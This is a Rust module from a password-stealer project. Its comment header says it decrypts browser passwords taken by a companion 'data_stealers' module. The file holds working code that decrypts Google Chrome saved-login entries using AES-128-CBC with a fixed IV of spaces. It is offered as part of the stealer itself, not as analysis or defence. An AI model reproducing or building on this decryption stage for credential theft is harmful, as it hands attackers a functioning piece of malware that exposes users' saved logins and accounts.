/**
 * Module contains algorithms for passwords decryption.
 * Such algorithms use stealed data (see data_stealers.rs module)
 * and depends on browser.
 *
 * Max A.Jurankov (astronmax) 2022
 */
use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};

type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

// Decryptor interface
pub trait Decryptor {
    fn decrypt(&self, enc: &mut [u8], key: &[u8]) -> String;
}

// Google Chrome passwords decryptor
pub struct ChromeDecryptor {}

impl ChromeDecryptor {
    pub fn new() -> Self {
        ChromeDecryptor {}
    }
}

impl Decryptor for ChromeDecryptor {
    // Method to decrypt password from Google Chrome login data
    // enc needs to be mutable because we use it like buffer
    fn decrypt(&self, enc: &mut [u8], key: &[u8]) -> String {
        // standart padding, aes128, spaces in iv
        let iv: [u8; 16] = [0x20; 16];
        let dec = Aes128CbcDec::new(key.into(), &iv.into())
            .decrypt_padded_mut::<Pkcs7>(&mut enc[3..])
            .unwrap();

        match std::str::from_utf8(dec) {
            Ok(v) => v.to_string(),
            Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
        }
    }
}
